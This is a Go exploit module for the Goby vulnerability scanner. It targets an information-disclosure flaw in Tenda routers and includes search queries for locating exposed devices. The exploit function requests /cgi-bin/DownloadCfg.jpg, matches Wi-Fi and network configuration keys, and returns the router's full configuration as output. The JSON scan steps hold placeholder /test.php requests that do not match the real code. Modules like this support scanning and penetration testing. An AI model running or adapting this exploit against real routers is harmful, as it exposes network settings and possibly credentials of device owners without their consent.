package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tenda router DownloadCfg information leakage vulnerability",
    "Description": "<p>Tenda router is an intelligent unlimited router from Shenzhen Jixiang Tenda Technology Co., LTD.</p><p>Tenda router has information leakage vulnerability, attackers can read sensitive system information by constructing special URL addresses.</p>",
    "Product": "Tenda-Router",
    "Homepage": "http://www.tenda.com.cn/",
    "DisclosureDate": "2023-02-25",
    "PostTime": "2023-08-01",
    "Author": "715827922@qq.com",
    "FofaQuery": "(title=\"Tenda | LOGIN\" || title=\"Tenda|登录\" || title==\"Tenda\" || (title=\"Tenda \" && title=\"Router\") || (body=\"('TENDA '+sys_target+' Router');\" && body!=\"href=\\\\\\\"http://www.nexxtsolutions.com/\") || server=\"access to tenda \" || body=\"background:url(tenda-logo-big.png)\" || body=\"/css/tenda.css\" || title=\"TENDA 11N无线路由器登录界面\" || (title=\"Tenda Web Master\" && (body=\"router to restore\" || body=\"router and reset\")) || title==\"Tenda Wireless Router\") && header!=\"360 web server\" && body!=\"Server: couchdb\"",
    "GobyQuery": "(title=\"Tenda | LOGIN\" || title=\"Tenda|登录\" || title==\"Tenda\" || (title=\"Tenda \" && title=\"Router\") || (body=\"('TENDA '+sys_target+' Router');\" && body!=\"href=\\\\\\\"http://www.nexxtsolutions.com/\") || server=\"access to tenda \" || body=\"background:url(tenda-logo-big.png)\" || body=\"/css/tenda.css\" || title=\"TENDA 11N无线路由器登录界面\" || (title=\"Tenda Web Master\" && (body=\"router to restore\" || body=\"router and reset\")) || title==\"Tenda Wireless Router\") && header!=\"360 web server\" && body!=\"Server: couchdb\"",
    "Level": "2",
    "Impact": "<p>Tenda router has information leakage vulnerability, attackers can read sensitive system information by constructing special URL addresses.</p>",
    "Recommendation": "<p>1. Encrypt key information.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [
        "http://www.tenda.com.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "Tenda 路由器 DownloadCfg 信息泄露漏洞",
            "Product": "Tenda-路由器",
            "Description": "<p>Tenda 路由器是深圳市吉祥腾达科技有限公司的一款智能无限路由器。</p><p>Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、将关键信息进行加密处理。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Tenda router DownloadCfg information leakage vulnerability",
            "Product": "Tenda-Router",
            "Description": "<p>Tenda router is an intelligent unlimited router from Shenzhen Jixiang Tenda Technology Co., LTD.</p><p>Tenda router has information leakage vulnerability, attackers can read sensitive system information by constructing special URL addresses.</p>",
            "Recommendation": "<p>1. Encrypt key information.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Tenda router has information leakage vulnerability, attackers can read sensitive system information by constructing special URL addresses.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10818"
}`

	sendPayload2dcx8 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/cgi-bin/DownloadCfg.jpg")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload2dcx8(u)
			if err != nil || rsp.StatusCode != 200 {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "wl0_ssid") && strings.Contains(rsp.Utf8Html, "lan_netmask") && strings.Contains(rsp.Utf8Html, "vlan_nat_port")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			rsp, err := sendPayload2dcx8(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html
			}
			return expResult
		},
	))
}

